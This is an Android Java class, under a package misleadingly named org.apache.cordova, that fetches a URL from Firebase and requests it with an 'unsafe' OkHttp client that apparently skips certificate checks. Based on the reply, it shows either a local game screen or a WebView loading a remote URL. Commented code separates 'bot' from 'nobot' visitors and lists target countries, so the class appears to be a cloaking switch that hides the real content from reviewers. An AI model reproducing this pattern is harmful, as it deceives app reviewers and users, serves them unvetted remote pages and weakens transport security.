package org.apache.cordova.repository.impl;

import static org.apache.cordova.constants.TableField.KEY_DATASET;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import androidx.preference.PreferenceManager;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.Gson;

import org.apache.cordova.constants.TableField;
import org.apache.cordova.http.HttpClient;
import org.apache.cordova.ScreenType;
import org.apache.cordova.domen.Dataset;
import org.apache.cordova.repository.AbstractDatasetRepository;

import com.walhalla.ui.DLog;
import org.apache.mvp.presenter.MainPresenter;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;


/*
 * Get URL From Firebase
 * Call this url from OkHttp, and get new URL from response
 *
 * */

public class ExFirebaseRepository extends AbstractDatasetRepository implements Callback {

    
    private final Handler handler;

    private final ChildEventListener _cel = new ChildEventListener() {

        //Child event listener
        @Override
        public void onChildAdded(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

        }


        /**
         * Modify in One field
         */
        @Override
        public void onChildChanged(@NonNull DataSnapshot dataSnapshot, @Nullable String previous) {
            /*
             * Other field null
             */
//            DLog.d("@1" + dataSnapshot.toString());
//            DLog.d("@2" + previous);
        }

        @Override
        public void onChildRemoved(@NonNull DataSnapshot dataSnapshot) {

        }

        @Override
        public void onChildMoved(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

        }

        @Override
        public void onCancelled(@NonNull @NotNull DatabaseError error) {
            DLog.handleException(error.toException());
            // Failed to getConfig value
            if (callback != null) {
                callback.successResponse(new Dataset(false, "", false, ""));
            }
        }

    };

    private final ValueEventListener _vel = new ValueEventListener() {

        @Override
        public void onDataChange(@NonNull DataSnapshot dataSnapshot) {

            DLog.d("! -->: [" + dataSnapshot.getKey() + "] " + dataSnapshot.toString());

            // Get Post object and use the values to update the UI
            //Post post = dataSnapshot.getValue(Post.class);
            if (KEY_DATASET.equals(dataSnapshot.getKey())) {
                try {
                    Dataset value = dataSnapshot.getValue(Dataset.class);
                    if (callback != null) {

                        //value.setEnabled(true);
                        //value.url = "https://twitter.com/";
                        //callback.successResponse(value);

                        if (value != null) {
                            SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
                            String url = MainPresenter.makeUrl(value.url, preferences, context);
                            //DLog.d("@@" + url);
                            OkHttpClient client = HttpClient.getUnsafeOkHttpClient(context);
                            Request request = new Request.Builder().url(url).build();
                            Call call = client.newCall(request);
                            call.enqueue(ExFirebaseRepository.this);
                        }
                    }
                } catch (Exception e) {
                    //DLog.d("@@@: " + dataSnapshot.toString());
                    DLog.handleException(e);
                }
            }
        }

        @Override
        public void onCancelled(DatabaseError databaseError) {
            DLog.handleException(databaseError.toException());
            // Failed to getConfig value
            if (callback != null) {
                callback.successResponse(new Dataset(false, "", false, ""));
            }
        }
    };

    public ExFirebaseRepository(Handler handler, Context context) {
        super(context);
        this.handler = handler;
    }

//    public void write() {
//        // Write a message to the database
//        FirebaseDatabase database = FirebaseDatabase.getInstance();
//        database.setPersistenceEnabled(true);
//        DatabaseReference myRef = database.getReference();
//        myRef.setValue(new Dataset(true, "http://ya.ru", true, "ru|ua|de|ch"));
//        myRef.addValueEventListener(postListener);
//    }

//    private void writeNewUser(String userId, String name, String email) {
//        Dataset user = new Dataset(
//                //        name, email
//        );
//        FirebaseDatabase database = FirebaseDatabase.getInstance();
//        database.setPersistenceEnabled(true);
//
//        DatabaseReference mDatabase = database.getReference("message");
//        mDatabase.child(Const.KEY_USERS).child(userId).setValue(user);
//        mDatabase.addValueEventListener(postListener);
//    }

    @Override
    public void getConfig(Context context) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference reference = database.getReference(KEY_DATASET);

            reference.addValueEventListener(_vel);
            reference.addChildEventListener(_cel);
        } catch (Exception e) {
            DLog.handleException(e);
        }

// Write a message to the database
//        FirebaseDatabase database = FirebaseDatabase.getInstance();
//        DatabaseReference reference = database.getReference("message");
//        // Read from the database
//        reference.addValueEventListener(new ValueEventListener() {
//            @Override
//            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
//                // This method is called once with the initial value and again
//                // whenever data at this location is updated.
//                String value = dataSnapshot.getValue(String.class);
//                Log.d(TAG, "Value is: " + value);
//            }
//
//            @Override
//            public void onCancelled(@NonNull DatabaseError error) {
//                // Failed to getConfig value
//                Log.w(TAG, "Failed to getConfig value.", error.toException());
//            }
//        });
    }

    //OkHttpCallback
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        DLog.handleException(e);
        //handler.post(() -> {
        callback.successResponse(new Dataset(ScreenType.GAME_VIEW, null));
        //});
    }

    //OkHttpCallback
    String json = "";

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {

        ResponseBody body = response.body();
        json = "";
        if (body != null) {
            json = body.string();
        }
        handler.post(() -> {
//            if (Config.TAG_NOBOT.equals(var0)) {
//                makeScreen(new Dataset(WEB_VIEW, "https://google.com"));
//            } else if (Const.TAG_BOT.equals(var0)) {
//                makeScreen(new Dataset(ScreenType.GAME_VIEW, null));
//            } else {
//                makeScreen(new Dataset(ScreenType.GAME_VIEW, null));
//            }

            if (json.isEmpty()) {
                callback.successResponse(new Dataset(ScreenType.GAME_VIEW, null));
            } else {
                try {
                    DLog.d("@" + json);
                    Gson gson = new Gson();
                    KwkRemoteRepository.KwkResponse entity = gson.fromJson(json, KwkRemoteRepository.KwkResponse.class);
                    Dataset aa = new Dataset(ScreenType.WEB_VIEW, entity.url);
                    aa.enabled = true;
                    callback.successResponse(aa);
                } catch (Exception e) {
                    DLog.handleException(e);
                }
            }
        });
    }
}